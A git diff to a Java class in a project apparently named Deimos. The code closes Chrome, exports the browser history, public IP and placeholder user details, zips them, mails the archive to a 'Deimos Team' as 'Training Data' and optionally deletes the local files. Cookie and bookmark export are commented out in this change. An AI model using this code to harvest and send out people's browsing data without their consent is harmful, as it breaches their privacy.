@@ -11,6 +11,7 @@ import org.sqlite.SQLiteException;
 import deimos.common.DeimosConfig;
 import deimos.common.Mailer;
 import deimos.common.ProcessFileUtils;
+import deimos.common.TimeUtils;
 
 /**
  * Combines all export functions,
@@ -24,9 +25,9 @@ import deimos.common.ProcessFileUtils;
  */
 
 public class ExportAll {
-	
+
 	public static final String PROCESS_CHROME_WIN = "chrome.exe";
-	
+
 	public static boolean isChromeRunning() {
 		try {
 			return ProcessFileUtils.isProcessRunning(ExportAll.PROCESS_CHROME_WIN);
@@ -34,12 +35,12 @@ public class ExportAll {
 			return false;
 		}
 	}
-	
+
 	public static boolean killChrome() {
 		System.out.print("Ensuring Chrome is not running: ");
-		
+
 		boolean killed = false;
-		
+
 		try
 		{
 			if(ProcessFileUtils.isProcessRunning(PROCESS_CHROME_WIN))
@@ -51,38 +52,38 @@ public class ExportAll {
 				killed = true;
 			}
 		} catch (IOException e) {
-			
+
 			e.printStackTrace();
 		}
 		System.out.println(killed);
 		return killed;
 	}
-	
+
 	/**
 	 * Deletes all the files defined in DeimosConfig
 	 * @return true if success, false if was unable to delete all the files.
 	 */
 	public static boolean deleteOutputFiles() {
-		
+
 		boolean success = true;
-		
+
 		int count_files = 0;
-		
+
 		for(String filename : DeimosConfig.FILES_OUTPUT_ALL) {
-			
+
 			File file = new File(filename);
-			
+
 			boolean result = file.delete();
 			if(result) count_files++;
 			success = success & result;
 		}
-		
+
 		System.out.println(count_files+ " file(s) deleted.");
-		
+
 		return success;
 	}
-	
-	
+
+
 	public static void mailOutputToDeimosTeam() {
 
 		String date = new SimpleDateFormat("dd/MM/yy HH:mm:ss").format(new Date());
@@ -91,48 +92,58 @@ public class ExportAll {
 		Mailer.mailToDeimosTeam("Training Data: "+date,
 				"Sample body in ExportAll",
 				DeimosConfig.FILE_OUTPUT_ALL_ZIP);
-		
+
 	}
 
 	public static void main(String[] args) {
-		
+
+		long startTime = System.currentTimeMillis();
+
 		killChrome();
-		
-		ExportBookmarks.retreiveBookmarksAsFile(DeimosConfig.FILE_OUTPUT_BOOKMARKS);
-		
+
+		/*ExportBookmarks.retreiveBookmarksAsFile(DeimosConfig.FILE_OUTPUT_BOOKMARKS);
+
 		try {
 			ExportCookies.retreiveCookiesAsFile(DeimosConfig.FILE_OUTPUT_COOKIES);
 		} catch (SQLiteException e) {
-			
+
 			e.printStackTrace();
-		}
-		
+		}*/
+
 		try {
 			ExportHistory.retreiveHistoryAsFile(DeimosConfig.FILE_OUTPUT_HISTORY);
 		}
 		catch (SQLiteException sle) {
-			
+
 			sle.printStackTrace();
 		}
-		
+
 		try {
 			ExportIP.retrievePublicIPAsFile(DeimosConfig.FILE_OUTPUT_PUBLICIP);
 		} catch (UnknownHostException e) {
 
 			e.printStackTrace();
 		}
-		
+
 		ExportUserInfo.retrieveUserInfoAsFile("John", "Doe",
 				"male", 1995, null, DeimosConfig.FILE_OUTPUT_USERINFO);
-		
+
 		Zipper.zipOutputFiles(DeimosConfig.FILE_OUTPUT_ALL_ZIP);
 		
-		mailOutputToDeimosTeam();
+		long stopTime = System.currentTimeMillis();
+		System.out.println("\nAll Phase 1 operations complete. Took "+TimeUtils.formatHmss(stopTime-startTime));
 
-       	System.out.println("Finished!");
+		mailOutputToDeimosTeam();
 		
-       	if(DeimosConfig.OPTION_DELETE_P1_OUTPUT)
-       		deleteOutputFiles();
+
+		System.out.println("Mailed output to Deimos Team.");
+
+		if(DeimosConfig.OPTION_DELETE_P1_OUTPUT)
+			deleteOutputFiles();
+
+		long stopTime2 = System.currentTimeMillis();
+
+		System.out.println("\nMailing took "+TimeUtils.formatHmss(stopTime2-stopTime));
 	}
 
 }
